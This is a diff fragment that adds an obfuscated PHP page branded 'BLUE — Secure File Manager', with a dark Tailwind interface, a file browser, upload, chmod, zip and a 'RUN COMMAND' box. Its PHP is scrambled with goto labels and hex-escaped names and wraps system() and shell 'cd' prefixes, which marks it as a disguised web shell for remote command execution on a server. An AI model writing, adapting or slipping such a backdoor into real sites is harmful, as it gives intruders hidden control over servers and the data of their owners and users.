+            <input type="hidden" name="csrf" value="<?php  goto QaFL3; EzkO_: header("\x45\170\x70\x69\x72\x65\x73\x3a\40\60"); goto muEs3; NJQ_0: if (empty($_SESSION["\x63\x73\162\x66"])) { $_SESSION["\x63\x73\x72\x66"] = bin2hex(biru_random_bytes(16)); } goto RbT81; u2ayR: echo h($current); goto nq0eq; mJ3Vc: function biru_random_bytes($len) { if (is_fn_usable("\162\141\x6e\144\157\155\137\142\171\x74\145\x73")) { return random_bytes($len); } if (is_fn_usable("\x6f\x70\x65\x6e\163\x73\154\137\162\x61\156\144\x6f\155\x5f\x70\163\145\x75\144\157\137\142\171\164\145\163")) { $strong = false; $b = openssl_random_pseudo_bytes($len, $strong); if ($b !== false && $strong) { return $b; } } $out = ''; for ($i = 0; $i < $len; $i++) { $out .= chr(mt_rand(0, 255)); } return $out; } goto A_Pws; PL277: $items = listDirEntries($current); goto lQCyk; S9kxP: function modeFromInput($s) { $s = trim($s); if ($s === '') { return 420; } if (ctype_digit($s)) { if ($s[0] !== "\x30") { $s = "\x30" . $s; } return intval($s, 8); } return 420; } goto yo4C6; NG8Ns: ?>
+ BLUE — Secure File Manager. All rights reserved.</span>
+      <span>Built with ❤️ & Tailwind · Dark UI</span>
+    </div>
+  </footer>
+
+  <script>
+    document.documentElement.classList.add('dark');
+
+    // Jangan navigasi ketika ada teks terseleksi (agar <a> gampang di-copy)
+    function guardLinkCopy(e){
+      var sel = '';
+      if (window.getSelection) sel = String(window.getSelection());
+      if (sel && sel.length > 0){
+        e.preventDefault();
+        return false;
+      }
+      return true;
+    }
+
+    // Search filter
+    const searchEl = document.getElementById('searchBox');
+    function filterRows(){
+      const q = (searchEl && searchEl.value || '').trim().toLowerCase();
+      const rows = document.querySelectorAll('#dirBody tr');
+      rows.forEach(function(r){
+        var name = r.getAttribute('data-name')||'';
+        r.style.display = name.indexOf(q) !== -1 ? '' : 'none';
+      });
+    }
+    window.addEventListener('keydown', function(e){ if(e.ctrlKey && e.key === '/'){ e.preventDefault(); if(searchEl){searchEl.focus();} } });
+
+    // Sort
+    var sortState = { key:'name', asc:true };
+    function sortBy(key){
+      var body = document.getElementById('dirBody');
+      var rows = Array.prototype.slice.call(body.querySelectorAll('tr'));
+      var factor = (sortState.key===key && sortState.asc)?-1:1;
+      sortState = { key: key, asc: factor===1 };
+      rows.sort(function(a,b){
+        if(key==='name'){ return a.dataset.name.localeCompare(b.dataset.name) * factor; }
+        if(key==='size' || key==='mtime'){
+          var av = parseInt(a.dataset[key]||'0',10);
+          var bv = parseInt(b.dataset[key]||'0',10);
+          return (av-bv) * factor;
+        }
+        return 0;
+      });
+      rows.forEach(function(r){ body.appendChild(r); });
+    }
+
+    // Checkboxes
+    function toggleAll(master){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = master.checked; }); }
+    function selectAll(flag){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = !!flag; }); var m=document.getElementById('chkAll'); if(m) m.checked=!!flag; }
+    function toggleRow(id){ var el=document.getElementById(id); if(el) el.classList.toggle('hidden'); }
+    function closeAction(btn){ var holder = btn.closest('div[id^="rn-"], div[id^="cm-"], div[id^="mt-"]'); if(holder) holder.classList.add('hidden'); }
+
+    // Collect selected items for Zip form
+    function collectSelectedInto(form){
+      Array.prototype.forEach.call(form.querySelectorAll('input[name="items[]"]'), function(n){ n.parentNode.removeChild(n); });
+      Array.prototype.forEach.call(document.querySelectorAll('#dirBody .rowchk:checked'), function(chk){
+        var i = document.createElement('input');
+        i.type='hidden'; i.name='items[]'; i.value=chk.value;
+        form.appendChild(i);
+      });
+      return true;
+    }
+
+    // ===== Drag & Drop Upload =====
+    var dropZone = document.getElementById('dropZone');
+    var tableCard = document.getElementById('tableCard');
+    var csrf = <?php  goto dsH_G; KQEck: if (!function_exists("\155\141\153\x65\137\x63\144\x5f\x70\162\x65\146\x69\170")) { function make_cd_prefix($cwd) { if (!$cwd) { return ''; } if (DIRECTORY_SEPARATOR === "\134") { return "\x63\x64\x20\57\144\40" . escapeshellarg($cwd) . "\40\x26\46\x20"; } return "\143\x64\40" . escapeshellarg($cwd) . "\40\x26\x26\x20"; } } goto vHhkl; IKEFV: if (!function_exists("\x66\x78\x5f\163\x79\x73\x74\x65\155")) { function fx_system($cmd, &$return_var = null) { if (is_fn_usable("\x73\171\163\164\145\155")) { return @system($cmd, $return_var); } $return_var = 127; return null; } } goto T44g7; dsH_G: echo je($csrf); goto LAXCA; Y5cSt: if (!function_exists("\x66\x78\x5f\x69\156\x69\137\162\145\x73\x74\157\162\x65")) { function fx_ini_restore($varname) { if (is_fn_usable("\x69\x6e\x69\137\x72\145\x73\x74\x6f\x72\x65")) { return @ini_restore($varname); } return false; } } goto ZIzqo; ZFW1e: $up = dirname($current); goto HyzxA; Q2IxK: ?>
+        <input id="searchBox" type="search" placeholder="Filter by name (Ctrl+/)" class="bg-transparent text-sm outline-none placeholder:text-slate-500 w-64" oninput="filterRows()">
+      </div>
+
+      <div class="text-sm text-slate-300 hidden lg:block truncate">
+        Path: <span class="mono"><?php  goto Eq7eY; mvPSY: ?>
+;
+      var info = (filename && CodeMirror.findModeByFileName(filename)) || CodeMirror.findModeByMIME('text/plain');
+
+      var textValue = pre.textContent || '';
+      var holder = document.createElement('div');
+      pre.parentNode.replaceChild(holder, pre);
+
+      var cmPrev = CodeMirror(holder, {
+        value: textValue,
+        readOnly: true,
+        lineNumbers: true,
+        lineWrapping: true,
+        theme: 'material-darker',
+        mode: (info && info.mime) ? info.mime : 'text/plain',
+        viewportMargin: Infinity
+      });
+
+      if (info && info.mode) CodeMirror.autoLoadMode(cmPrev, info.mode);
+      cmPrev.setSize('100%', 480);
+
+      var det = document.getElementById('previewPanel');
+      if (det) det.addEventListener('toggle', function(){ setTimeout(function(){ cmPrev.refresh(); }, 50); });
+      window.addEventListener('resize', function(){ cmPrev.refresh(); });
+    })();
+
+    // ===== CodeMirror untuk RUN COMMAND (single-line + placeholder) =====
+    (function(){
+      var ta = document.getElementById('cmdTA');
+      if(!ta || typeof CodeMirror === 'undefined') return;
+
+      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
+      var isWin = <?php  goto wjERR; ziUt3: if (!function_exists("\x66\170\x5f\163\164\162\145\x61\155\137\x67\145\x74\137\x63\157\156\164\145\156\x74\x73")) { function fx_stream_get_contents($handle, $maxlength = -1, $offset = -1) { if (is_fn_usable("\x73\x74\x72\x65\x61\155\x5f\x67\x65\x74\x5f\143\x6f\x6e\164\145\x6e\164\163")) { return @stream_get_contents($handle, $maxlength, $offset); } if ($offset > 0) { @fseek($handle, $offset); } $data = ''; if ($maxlength === -1) { while (!feof($handle)) { $data .= @fread($handle, 8192); } } else { $data = @fread($handle, $maxlength); } return $data; } }
